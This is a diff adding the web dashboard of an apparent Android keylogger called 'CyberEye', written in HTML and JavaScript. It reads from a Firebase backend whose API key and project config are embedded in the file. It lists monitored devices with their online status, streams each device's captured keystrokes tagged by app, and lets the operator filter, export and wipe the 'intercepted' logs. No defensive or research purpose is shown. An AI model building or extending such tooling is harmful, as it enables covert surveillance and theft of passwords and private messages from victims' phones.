@@ -1,0 +1,462 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CyberEye - Keylog Stream</title>
+    <script src="https://cdn.socket.io/4.5.4/socket.io.min.js"></script>
+    <script src="/static/firebase-mock.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@700;900&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --bg: #0e1118; /* Set to custom dark background */
+            --surface: #0e1118; /* Match status bar background */
+            --time-color: #5c6480;
+            --app-color: #5b8bf5;
+            --text-color: #2ecc8f;
+            --border: rgba(255,255,255,0.07);
+            --hover-bg: rgba(255,255,255,0.02);
+        }
+
+        body {
+            font-family: 'Consolas', 'Courier New', monospace;
+            background: var(--bg);
+            color: var(--text-color);
+            margin: 0;
+            padding: 0;
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+
+        /* ── HEADER ── */
+        .header {
+            background: var(--surface);
+            padding: 15px 25px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-bottom: 1px solid var(--border);
+            z-index: 10;
+        }
+
+        .header h1 {
+            margin: 0;
+            font-size: 1.2rem;
+            color: #fff;
+            font-weight: 700;
+            letter-spacing: 1px;
+        }
+
+        .status-box {
+            display: none !important;
+            align-items: center;
+            gap: 12px;
+            background: rgba(0,0,0,0.3);
+            padding: 6px 16px;
+            border-radius: 99px;
+            border: 1px solid var(--border);
+        }
+
+        .dot {
+            width: 10px;
+            height: 10px;
+            border-radius: 50%;
+            background: #f55b5b;
+        }
+
+        .dot.online {
+            background: var(--text-color);
+            box-shadow: 0 0 12px var(--text-color);
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+            0%, 100% { opacity: 1; transform: scale(1); }
+            50% { opacity: 0.5; transform: scale(0.9); }
+        }
+
+        /* ── TOOLBAR ── */
+        .toolbar {
+            padding: 12px 25px;
+            background: var(--bg);
+            display: flex;
+            gap: 15px;
+            align-items: center;
+            border-bottom: 1px solid var(--border);
+        }
+
+        select {
+            background: #1c232e;
+            color: #fff;
+            border: 1px solid var(--border);
+            padding: 10px;
+            border-radius: 6px;
+            outline: none;
+            font-size: 0.9rem;
+            flex: 1;
+            cursor: pointer;
+        }
+
+        .search-box {
+            background: #1c232e;
+            border: 1px solid var(--border);
+            color: #fff;
+            padding: 10px 15px;
+            border-radius: 6px;
+            width: 300px;
+            outline: none;
+            font-size: 0.9rem;
+            transition: border-color 0.2s;
+        }
+        .search-box:focus { border-color: var(--app-color); }
+
+        .btn {
+            background: #1c232e;
+            color: #fff;
+            border: 1px solid var(--border);
+            padding: 10px 20px;
+            border-radius: 6px;
+            cursor: pointer;
+            font-size: 0.85rem;
+            font-weight: 600;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            transition: all 0.2s;
+        }
+
+        .btn:hover {
+            background: #252e3b;
+            border-color: var(--text-color);
+            transform: translateY(-1px);
+        }
+
+        .btn-clear:hover {
+            border-color: #f55b5b;
+            color: #f55b5b;
+            background: rgba(245, 91, 91, 0.05);
+        }
+
+        .brand-text-white {
+            background: linear-gradient(to bottom, #FFFFFF 0%, #9CA3AF 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+        .brand-text-accent {
+            background: linear-gradient(to bottom, #22D3EE 0%, #0891B2 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            margin-left: 0.25rem;
+        }
+
+        /* ── LOG FEED ── */
+        .log-feed {
+            flex: 1;
+            overflow-y: auto;
+            background: #080a0f;
+            display: flex;
+            flex-direction: column;
+            margin: 10px 20px 20px 25px; /* Space on left, right, bottom */
+            border-radius: 12px; /* Curved edges */
+            border: 1px solid var(--border);
+        }
+
+        .kl-line {
+            display: flex;
+            padding: 14px 25px;
+            border-bottom: 1px solid rgba(255,255,255,0.03);
+            font-size: 0.92rem;
+            line-height: 1.5;
+            transition: background 0.15s;
+            animation: fadeIn 0.3s ease;
+        }
+
+        .kl-line:hover {
+            background: var(--hover-bg);
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(8px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .kl-time {
+            color: var(--time-color);
+            width: 170px;
+            flex-shrink: 0;
+            font-size: 0.8rem;
+        }
+
+        .kl-app {
+            color: var(--app-color);
+            width: 140px;
+            flex-shrink: 0;
+            font-weight: 600;
+            text-transform: lowercase;
+        }
+
+        .kl-text {
+            color: var(--text-color);
+            flex: 1;
+            word-break: break-all;
+        }
+
+        /* ── SCROLLBAR ── */
+        ::-webkit-scrollbar { width: 6px; }
+        ::-webkit-scrollbar-track { background: transparent; }
+        ::-webkit-scrollbar-thumb { background: #1e2333; border-radius: 10px; }
+        ::-webkit-scrollbar-thumb:hover { background: var(--time-color); }
+
+        .empty-state {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100%;
+            color: var(--time-color);
+            gap: 15px;
+        }
+
+        /* ── CYBER LOAD BAR ── */
+        .cyber-loader {
+            height: 24px;
+            width: 100%;
+            background: transparent;
+            position: relative;
+            display: none;
+            overflow: visible;
+        }
+        .cyber-loader-bar {
+            height: 3px;
+            background: linear-gradient(90deg, #2ecc8f 0%, #22d3ee 100%);
+            width: 0%; /* Start at 0% and animate width */
+            position: absolute;
+            left: 0;
+            top: 0;
+            transition: width 0.25s cubic-bezier(0.4, 0, 0.2, 1);
+            box-shadow: none; /* Removed heavy glow for professional clean look */
+        }
+        .cyber-loader-text {
+            color: var(--text-color);
+            font-size: 11px;
+            font-family: 'Consolas', monospace;
+            position: absolute;
+            right: 25px;
+            top: 8px;
+            font-weight: 700;
+            letter-spacing: 0.5px;
+            opacity: 0.85;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="header">
+        <div style="display: flex; align-items: center; gap: 8px;">
+            <div style="font-family: 'Orbitron', sans-serif; font-weight: 700; font-size: 1.5rem; display: flex; align-items: center; line-height: 1; letter-spacing: 0.05em; text-transform: uppercase;">
+                <span class="brand-text-white">CYBER</span><span class="brand-text-accent">EYE</span>
+            </div>
+        </div>
+        <div class="status-box">
+            <div id="status-dot" class="dot"></div>
+            <span id="status-text">OFFLINE</span>
+        </div>
+    </div>
+
+    <div class="toolbar">
+        <select id="device-select" onchange="switchDevice(this.value)">
+            <option value="">Select Device...</option>
+        </select>
+        <input type="text" class="search-box" id="search-input" placeholder="Filter logs..." oninput="filterLogs()">
+        <button class="btn" onclick="downloadLogs()"><i class="fas fa-file-export"></i> Export</button>
+        <button class="btn btn-clear" onclick="clearLogs()"><i class="fas fa-trash-alt"></i> Wipe</button>
+    </div>
+
+    <div class="cyber-loader" id="cyber-loader">
+        <div class="cyber-loader-bar"></div>
+        <div class="cyber-loader-text" id="cyber-loader-text">CONNECTING NODE... 0%</div>
+    </div>
+
+    <div class="log-feed" id="logs">
+        <div class="empty-state">
+            <i class="fas fa-satellite fa-3x"></i>
+            <p>SELECT AN ACTIVE NODE TO START INTERCEPTING</p>
+        </div>
+    </div>
+
+    <script>
+        const firebaseConfig = {
+            apiKey: "AIzaSyAHkYidYFElwq3Mt13t0jlpIlhw33DtVco",
+            databaseURL: "https://cyber-eye-ccb1e-default-rtdb.firebaseio.com",
+            projectId: "cyber-eye-ccb1e",
+            storageBucket: "cyber-eye-ccb1e.firebasestorage.app",
+            appId: "1:652079429761:android:e17fe06347e2ba0b1a3580"
+        };
+        firebase.initializeApp(firebaseConfig);
+        const db = firebase.database();
+
+        let activeID = "";
+        let logStore = [];
+        const ONLINE_THRESHOLD = 300000;
+
+        // Parse query parameters
+        const urlParams = new URLSearchParams(window.location.search);
+        const paramId = urlParams.get('id');
+
+        window.addEventListener('DOMContentLoaded', () => {
+            if (paramId) {
+                const select = document.getElementById("device-select");
+                if (select) {
+                    select.style.display = 'none';
+                    select.value = paramId;
+                }
+                switchDevice(paramId);
+            }
+        });
+
+        // Load devices
+        db.ref("devices").on("value", snap => {
+            const select = document.getElementById("device-select");
+            const current = select.value || paramId || "";
+            select.innerHTML = "<option value=''>Select Device...</option>";
+            if(!snap.val()) return;
+
+            const now = Date.now();
+            Object.keys(snap.val()).forEach(id => {
+                const dev = snap.val()[id];
+                const online = (now - (dev.lastSeen || 0)) < ONLINE_THRESHOLD;
+                const opt = document.createElement("option");
+                opt.value = id;
+                opt.innerText = (online ? "🟢 " : "🔴 ") + id;
+                select.appendChild(opt);
+            });
+            if(current) select.value = current;
+        });
+
+        function switchDevice(id) {
+            if(!id) return;
+            activeID = id;
+            logStore = [];
+            document.getElementById("logs").innerHTML = "";
+
+            // Status monitoring
+            db.ref("devices/" + id).on("value", snap => {
+                const dev = snap.val();
+                if(!dev) return;
+                const dot = document.getElementById("status-dot");
+                const text = document.getElementById("status-text");
+                const online = (Date.now() - (dev.lastSeen || 0)) < ONLINE_THRESHOLD;
+
+                if(online) {
+                    dot.classList.add("online");
+                    text.innerText = "CONNECTED";
+                    text.style.color = "#2ecc8f";
+                } else {
+                    dot.classList.remove("online");
+                    text.innerText = "OFFLINE";
+                    text.style.color = "#f55b5b";
+                }
+            });
+
+            // Show loading bar & animate from 0% to 100%
+            const loader = document.getElementById("cyber-loader");
+            const bar = loader ? loader.querySelector(".cyber-loader-bar") : null;
+            const textVal = document.getElementById("cyber-loader-text");
+            if (loader && bar) {
+                bar.style.width = "0%";
+                if (textVal) textVal.innerText = "CONNECTING NODE... 0%";
+                loader.style.display = "block";
+            }
+
+            let progress = 0;
+            const progressInterval = setInterval(() => {
+                if (progress < 90) {
+                    progress += Math.floor(Math.random() * 15) + 5;
+                    if (progress > 90) progress = 90;
+                    if (bar) bar.style.width = progress + "%";
+                    if (textVal) textVal.innerText = "INTERCEPTING DATA PACKETS... " + progress + "%";
+                }
+            }, 150);
+
+            // Stream logs
+            db.ref("devices/" + id + "/keylogs").off();
+            db.ref("devices/" + id + "/keylogs").limitToLast(1000).once("value", () => {
+                clearInterval(progressInterval);
+                if (bar) bar.style.width = "100%";
+                if (textVal) textVal.innerText = "INTERCEPT COMPLETED! 100%";
+                setTimeout(() => {
+                    if (loader) loader.style.display = "none";
+                }, 400);
+            });
+            db.ref("devices/" + id + "/keylogs").limitToLast(1000).on("child_added", snap => {
+                const log = snap.val();
+                log.id = snap.key;
+                logStore.push(log);
+                renderLine(log);
+            });
+        }
+
+        function renderLine(log) {
+            const container = document.getElementById("logs");
+            const line = document.createElement("div");
+            line.className = "kl-line";
+
+            const pkg = log.pkg || log.app || "system";
+            const appShort = pkg.split('.').pop();
+            const date = new Date(log.time);
+            const timeStr = date.toLocaleDateString('en-GB', { day: '2-digit', month: 'short' }).toLowerCase() +
+                            ", " + date.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit', hour12: true }).toLowerCase();
+
+            line.innerHTML = `<span class="kl-time">${timeStr}</span>` +
+                             `<span class="kl-app">[${appShort}]</span>` +
+                             `<span class="kl-text">${esc(log.text)}</span>`;
+
+            if(container.querySelector('.empty-state')) container.innerHTML = "";
+            container.prepend(line);
+        }
+
+        function filterLogs() {
+            const query = document.getElementById("search-input").value.toLowerCase();
+            const container = document.getElementById("logs");
+            container.innerHTML = "";
+            const filtered = logStore.filter(l =>
+                (l.text || "").toLowerCase().includes(query) ||
+                (l.pkg || "").toLowerCase().includes(query)
+            );
+
+            if(filtered.length === 0) {
+                container.innerHTML = '<div class="empty-state"><p>No matches found.</p></div>';
+            } else {
+                filtered.forEach(renderLine);
+            }
+        }
+
+        function downloadLogs() {
+            if(!activeID) return;
+            const content = logStore.map(l => {
+                const date = new Date(l.time).toLocaleString();
+                return `[${date}] [${l.pkg}] ${l.text}`;
+            }).join('\n');
+            const blob = new Blob([content], { type: 'text/plain' });
+            const url = window.URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = `cybereye_keylogs_${activeID}.txt`;
+            a.click();
+        }
+
+        function clearLogs() {
+            if(!activeID || !confirm("DANGER: This will permanently erase intercepted logs. Proceed?")) return;
+            db.ref("devices/" + activeID + "/keylogs").remove();
+            logStore = [];
+            document.getElementById("logs").innerHTML = '<div class="empty-state"><p>Logs cleared successfully.</p></div>';
+        }
+
+        function esc(str) {
+            return String(str).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;');
+        }
+    </script>
+</body>
+</html>
